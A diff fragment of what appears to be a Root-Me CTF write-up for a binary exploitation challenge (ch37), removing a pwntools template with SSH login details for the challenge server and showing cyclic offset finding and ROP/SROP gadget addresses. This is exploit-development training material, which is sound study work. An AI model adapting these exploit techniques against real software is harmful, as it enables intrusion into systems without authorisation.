@@ -22,39 +22,6 @@ rop2 += bytes(srop_frame)
 ```
 
 ```python
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template
-from pwn import *
-import os
-
-exe = ELF('./ch37')
-
-#exe = ELF('/challenge/app-systeme/ch37/ch37')
-#context.terminal = ['tmux']
-
-def start(argv=[], *a, **kw):
-'''Start the exploit against the target.'''
-if args.GDB:
-return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, stdin=PTY)
-elif args.SSH:
-global s
-s = ssh(user='app-systeme-ch37', host='challenge03.root-me.org', port=2223, password='app-systeme-ch37')
-#s.upload("./What's your name : ", "/tmp/q/What's your name : ") # Have to chmod +x from ssh
-return s.process(["/challenge/app-systeme/ch37/ch37"], cwd='/tmp/q')
-elif args.GDB_SSH:
-p = ssh(user='app-systeme-ch37', host='challenge03.root-me.org', port=2223, password='app-systeme-ch37')
-return gdb.debug(["./ch37"], ssh=p, gdbscript=gdbscript)
-else:
-return process([exe.path] + argv, *a, **kw, stdin=PTY)
-
-gdbscript = '''
-b *0x400182
-set follow-fork-mode child
-c
-'''.format(**locals())
-
 def find_offset(io):
 io.sendline(cyclic(0x100))
 io.wait()
@@ -66,12 +33,6 @@ os.remove(corefile)
 
 io.close()
 return cyclic_find(core.fault_addr) #cyclic_find(core.rip/eip)
-
-#===========================================================
-
-# EXPLOIT GOES HERE
-
-#===========================================================
 
 write_no_rdx = 0x400163
 syscall = 0x4000ff
